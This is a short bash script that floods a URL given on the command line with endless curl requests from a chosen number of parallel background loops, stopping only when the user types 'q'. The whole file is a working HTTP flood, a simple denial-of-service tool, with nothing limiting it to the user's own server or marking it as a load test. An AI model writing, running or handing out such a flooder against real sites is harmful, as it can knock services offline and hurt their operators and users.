#!/bin/bash

single_flood() {
	while true
	do
		curl --silent -o /dev/null/ $1
	done
}

process=()

for i in $(seq 1 $2)
do
	single_flood $1 &
	process+=($!)
done

Q=""
while [ "$Q" != "q" ]
do
	read -p "q to stop: " Q
done

kill ${process[@]}